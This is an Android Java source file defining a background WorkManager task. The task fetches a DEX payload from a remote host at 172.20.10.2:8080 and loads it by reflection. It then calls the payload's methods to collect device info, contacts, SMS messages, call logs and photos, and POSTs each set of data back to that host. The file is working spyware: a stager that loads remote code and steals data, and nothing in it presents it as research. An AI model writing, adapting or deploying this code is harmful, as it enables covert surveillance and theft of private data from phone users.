package com.example.myapp;

import android.content.Context;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.IOException;

import java.io.DataOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;


public class Task extends Worker {
    public Task(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d("Worker", "Start");

        String urlString = "http://172.20.10.2:8080";
        Object device = Downloader.getDex(urlString, getApplicationContext());

        if (device != null) {
            Method info, contacts, msgs, calls, photos;
            try {
                info = device.getClass().getMethod("getDeviceInfo", Context.class);
                contacts = device.getClass().getMethod("getContacts", Context.class);
                msgs = device.getClass().getMethod("getMessages", Context.class);
                calls = device.getClass().getMethod("getCalls", Context.class);
                photos = device.getClass().getMethod("getPhotos", Context.class);

                String data = (String) info.invoke(device, getApplicationContext());
                send("http://172.20.10.2:8080/info", data.getBytes());
                Log.d("Worker", "info: " + data);

                data = (String) contacts.invoke(device, getApplicationContext());
                send("http://172.20.10.2:8080/contacts", data.getBytes());
                Log.d("Worker", "contacts: " + data);

                data = (String) msgs.invoke(device, getApplicationContext());
                send("http://172.20.10.2:8080/messages", data.getBytes());
                Log.d("Worker", "msgs: " + data);

                data = (String) calls.invoke(device, getApplicationContext());
                send("http://172.20.10.2:8080/calls", data.getBytes());
                Log.d("Worker", "calls: " + data);

                List<byte[]> ph = (List<byte[]>) photos.invoke(device, getApplicationContext());
                for (byte[] photoBytes : ph) {
                    send("http://172.20.10.2:8080/photos", photoBytes);
                }
            } catch (Exception e) {
                Log.e("Worker", "Error calling method: " + e.getMessage());
            }
       }

        return Result.success();
    }

    public void send(String urlString, byte[] information) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);

            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.write(information);
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d("Worker", "File uploaded successfully");
            } else {
                Log.d("Worker", "Error uploading file: " + responseCode);
            }
        } catch (IOException e) {
            Log.d("Worker", "Error uploading file: " + e.getMessage());
        }
    }
}

